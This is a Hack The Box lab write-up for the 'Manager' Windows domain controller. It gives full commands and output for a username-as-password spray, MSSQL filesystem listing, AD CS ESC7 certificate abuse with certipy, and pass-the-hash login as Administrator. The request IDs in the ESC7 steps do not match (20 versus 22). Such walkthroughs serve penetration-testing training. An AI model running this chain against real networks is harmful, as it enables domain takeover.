# Manager - HTB Labs Writeup

**Machine:** Manager (Windows AD)

**Difficulty:** Medium


<img width="1018" height="206" alt="1" src="https://github.com/user-attachments/assets/2f31adaa-5b4c-4a52-97df-c2f18a8e945e" />

## Background / Scope

-**Target IP:** `10.10.11.236`

-**Goal:** Obtain Administrator access on the machine in a lab environment

-**Machine Info:** Manager is a medium difficulty Windows machine which hosts an Active Directory environment with `AD CS` (Active Directory Certificate Services), a web server, and an `SQL` server. The foothold involves enumerating users using `RID` cycling and performing a password spray attack to gain access to the MSSQL service. The `xp_dirtree` procedure is then used to explore the filesystem, uncovering a website backup in the web-root. Extracting the backup reveals credentials that are reused to `WinRM` to the server. Finally, the attacker escalates privileges through AD CS via `ESC7` exploitation.

## Target Enumeration (nmap)

We start with Nmap Scanning

```python
 nmap -sC -sV 10.10.11.236
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 02:37 EST
Nmap scan report for manager.htb (10.10.11.236)
Host is up (0.50s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-28 14:38:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-28T14:40:12+00:00; +7h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-28T14:40:11+00:00; +7h00m02s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-27T19:22:28
|_Not valid after:  2055-11-27T19:22:28
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-11-28T14:40:12+00:00; +7h00m02s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-28T14:40:11+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-28T14:40:11+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-28T14:39:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.99 seconds
```

Nmap scan shows me default services are running on this machine.`MSSQL(1433)` looks interesting.I'll add domain name in `/etc/hosts/` 

```text
10.10.11.236            manager.htb  dc01.manager.htb
```

I've checked http service, but there is nothing interest



<img width="1193" height="559" alt="2" src="https://github.com/user-attachments/assets/037a4b35-d138-455c-847c-dcab8c0bce27" />



## Directory Brute Force

I'll try directory brute force via `feroxbuster`


```python
 feroxbuster -u http://10.10.11.236 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.236/
 🚩  In-Scope Url          │ 10.10.11.236
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://10.10.11.236/images => http://10.10.11.236/images/
200      GET        9l       25w     1255c http://10.10.11.236/images/envelope.png
200      GET        6l       20w     1360c http://10.10.11.236/images/location-o.png
200      GET       10l       42w     2704c http://10.10.11.236/images/call-o.png
200      GET       10l       43w     2023c http://10.10.11.236/images/call.png
200      GET        9l       41w     2465c http://10.10.11.236/images/s-4.png
200      GET      224l      650w     7900c http://10.10.11.236/service.html
200      GET        6l       22w     1052c http://10.10.11.236/images/location.png
200      GET        4l       20w     1337c http://10.10.11.236/images/s-2.png
200      GET       14l       48w     3837c http://10.10.11.236/images/logo.png
200      GET       85l      128w     1389c http://10.10.11.236/css/responsive.css
200      GET      157l      414w     5386c http://10.10.11.236/about.html
200      GET        7l       29w     1606c http://10.10.11.236/images/envelope-o.png
200      GET        6l       17w     1553c http://10.10.11.236/images/s-1.png
200      GET      165l      367w     5317c http://10.10.11.236/contact.html
200      GET      614l     1154w    11838c http://10.10.11.236/css/style.css
200      GET        9l       31w     2492c http://10.10.11.236/images/s-3.png
200      GET      507l     1356w    18203c http://10.10.11.236/index.html
200      GET       82l      542w    56157c http://10.10.11.236/images/contact-img.jpg
200      GET      149l      630w    53431c http://10.10.11.236/images/client.jpg
200      GET        2l     1276w    88145c http://10.10.11.236/js/jquery-3.4.1.min.js
200      GET     4437l    10999w   131863c http://10.10.11.236/js/bootstrap.js
200      GET     7192l    14433w   192348c http://10.10.11.236/css/bootstrap.css
200      GET      638l     3502w   311015c http://10.10.11.236/images/about-img.png
200      GET      507l     1356w    18203c http://10.10.11.236/
```

These assets didn't help to my enumeration process,so I move on



## SMB Enumeration

I tried `SMB` with anonymous access, but there are default shares 

```python
 smbclient -L //10.10.11.236 -N                    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


I'll use `netexec` to enumerate usernames on this machine with `RID` cycling

```python

netexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

I got the usernames.I made the list with usernames I got

```text
administrator
guest
krbtgt
domain
protected
dc01$
sqlserver2005sqlbrowseruser$dc01
zhong
cheng
ryan
raven
jinwoo
chinhae
operator

```

For bruteforcing the password with a list of common passwords get too long.So I check if usernames I've found use their usernames as password

```python

netexec smb 10.10.11.236 -u users -p users --no-bruteforce --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\domain:domain (Guest)
SMB         10.10.11.236    445    DC01             [+] manager.htb\protected:protected (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\dc01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\sqlserver2005sqlbrowseruser$dc01:sqlserver2005sqlbrowseruser$dc01 (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
```

It worked!

## Shell as Raven

I checked where I can use my finding creds.We have access to SMB, but not `winRM` 

```python
crackmapexec smb 10.10.11.236 -u operator -p operator
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 

crackmapexec winrm 10.10.11.236 -u operator -p operator
SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [-] manager.htb\operator:operator
```

As you remember, `MSSQL` is running on this machine

```python
 crackmapexec mssql 10.10.11.236 -u operator -p operator
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator

```

I'll use Impacket `mssqlclient.py` with using `windows-auth`

```python
impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth
Impacket v0.13.0.dev0+20250721.105211.75610382 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```

These commands I can run in `MSSQL` service.Some of them won't work because we don't have privilege to do this

```text
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
    
```

I tried to enable `xp_cmdshell`, but It didn't work

```python

SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```


I found out I can run `xp_dirtree`.This command allows me to list files on the filesystem.I found `website-backup-27-07-23-old.zip` file in `C:\inetpub\wwwroot`

```python
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1   

```

I just downloaded this `.zip`  with `wget http://10.10.11.236/website-backup-27-07-23-old.zip` .I unziped it and found `.old-conf.xml` file.There is interesting creds




<img width="581" height="337" alt="3" src="https://github.com/user-attachments/assets/37c7e009-5ee7-4f52-8fb2-fd5d3c54093b" />


These creds are valid


```python
crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123

crackmapexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```


Get access via `evil-winrm`

```python
evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.7
 Info: Establishing connection to remote endpoint                                       
*Evil-WinRM* PS C:\Users\Raven\Documents>
```

Obtain `user.txt`

```python
*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
07ba3fc1c2b242355**************
```

## Privilege Escalation

I didn't find anything from `BloodHound GUI`, so I'll check `Active Directory Certificate Services(ADCS)` using `certipy`

```python

certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates                                                                                                                          
[*] Finding certificate authorities                                                                                                                         
[*] Found 1 certificate authority                                                                                                                           
[*] Found 11 enabled certificate templates                                                                                                                  
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA                                                                                           
[*] Got CA configuration for 'manager-DC01-CA'                                                                                                              
[*] Enumeration output:                                                                                                                                     
Certificate Authorities                                                                                                                                     
  0                                                                                                                                                         
    CA Name                             : manager-DC01-CA                                                                                                   
    DNS Name                            : dc01.manager.htb                                                                                                  
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb                                                                            
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB                                                                                  
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00                                                                                         
    Certificate Validity End            : 2122-07-27 10:31:04+00:00                                                                                         
    Web Enrollment                      : Disabled                                                                                                          
    User Specified SAN                  : Disabled                                                                                                          
    Request Disposition                 : Issue                                                                                                             
    Enforce Encryption for Requests     : Enabled                                                                                                           
    Permissions                                                                                                                                             
      Owner                             : MANAGER.HTB\Administrators                                                                                        
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

The output shows me there is bad permission, with label `ESC(7)`

## ESC(7) Exploitation


### ESC7 – Certificate Authority Misconfiguration (Privilege Escalation)

ESC7 occurs when a user has overly permissive access rights on the Certificate Authority (CA), such as Manage CA or Manage Certificates. With these privileges, an attacker can modify CA settings, approve certificate requests, or enable vulnerable templates (e.g., SubCA). This effectively allows the attacker to issue a certificate for any account in the domain and authenticate as that user via PKINIT, leading to full domain compromise.[Here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) explaining how to exploit it


First of all , I need to add myself as a CA officer.With this tights, the attacker can add their account to the CA's officer list, allowing them to approve or issue certificate requests.
Raven has `ManageCa` rights

```python
certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

```


Second, Ensure the SubCA template is enabled on the CA

```python
certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns 10.10.11.236 -target dc01.manager.htb -ca manager-DC01-CA -enable-template 'SubCA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
  ```

                                                            
Then, Submit a certificate request using the SubCA template (expected to fail initially if no direct enrollment rights)


```python

certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 20
Would you like to save the private key? (y/N) y
[*] Saved private key to 20.key
[-] Failed to request certificate
```

Note my `RequestID=20`


Approve the pending request
```python
certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -issue-request '22' 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```


Now we can request Administrator certification.

```python
 certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -retrieve '22'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 22
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '22.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

With this admin certificate we can get the hash(To solve clock issue, run `ntpdate 10.10.11.236`)

```python

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```


Now we got a hash.We can get remote access via `evil-winrm`

```python

evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
                                        
Evil-WinRM shell v3.7
                                                                                                                   
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Obtained `root.txt`

```python
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
97dd0c54eac50be6e00526**********
```

⭐ If you found this writeup helpful — consider giving a star on GitHub!

















 


